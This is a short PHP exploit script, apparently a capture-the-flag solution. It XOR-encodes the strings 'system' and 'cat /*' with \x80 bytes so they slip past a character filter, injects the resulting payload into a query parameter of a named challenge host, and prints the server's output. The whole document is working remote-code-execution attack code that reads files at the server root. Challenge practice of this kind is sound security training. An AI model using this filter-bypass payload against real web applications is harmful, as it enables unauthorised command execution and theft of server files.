<?php
    function xorPayload($string) {
        $xor_str1 = str_repeat("\x80", strlen($string));
        $xor_str2 = $string ^ $xor_str1;
        return $xor_str1 . "^" . $xor_str2;
    }
    $command = "cat /*";
    $query = "(" . xorPayload("system") . ")(" . xorPayload($command) . ");";
    $url = "https://php.splitline.tw/?(%23°д°)=" . urlencode($query);
    print(file_get_contents($url));
